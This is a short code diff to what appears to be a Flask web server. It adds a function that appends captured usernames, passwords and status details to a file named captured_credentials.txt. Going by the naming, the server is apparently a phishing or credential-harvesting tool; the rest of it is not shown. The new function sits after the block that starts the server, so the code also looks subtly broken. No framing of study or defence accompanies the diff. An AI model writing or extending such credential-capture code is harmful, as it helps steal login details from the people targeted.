@@ -213,3 +213,14 @@ if __name__ == '__main__':
     print("="*60)
     
     app.run(host='0.0.0.0', port=8080, debug=False)
+
+# NEW: Function to save credentials to a file
+def save_to_file(data):
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+    with open('captured_credentials.txt', 'a') as f:
+        f.write(f"Timestamp: {timestamp}\n")
+        f.write(f"Username: {data['username']}\n")
+        f.write(f"Password: {data['password']}\n")
+        f.write(f"Status: {data['status']}\n")
+        f.write(f"Details: {data['details']}\n")
+        f.write("="*50 + "\n")
